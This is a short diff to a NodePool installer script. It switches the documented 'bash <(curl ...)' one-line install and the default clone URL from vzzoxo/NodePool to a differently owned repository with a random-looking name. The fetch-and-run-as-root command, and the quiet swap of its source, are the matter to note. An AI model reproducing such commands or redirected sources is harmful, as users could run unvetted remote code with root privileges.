@@ -3,7 +3,7 @@
 #
 # 用法:
 #   一键远程安装(自动克隆代码):
-#     bash <(curl -fsSL https://raw.githubusercontent.com/vzzoxo/NodePool/main/setup.sh)
+#     bash <(curl -fsSL https://raw.githubusercontent.com/wuzeliangv/jfehdsjee33633/main/setup.sh)
 #
 #   本地安装(已克隆代码,在项目根目录):
 #     sudo ./setup.sh
@@ -18,7 +18,7 @@
 
 set -euo pipefail
 
-DEFAULT_REPO_URL="https://github.com/vzzoxo/NodePool.git"
+DEFAULT_REPO_URL="https://github.com/wuzeliangv/jfehdsjee33633.git"
 REPO_URL="${REPO_URL:-${DEFAULT_REPO_URL}}"
 DEFAULT_INSTALL_DIR="/root/NodePool"
 
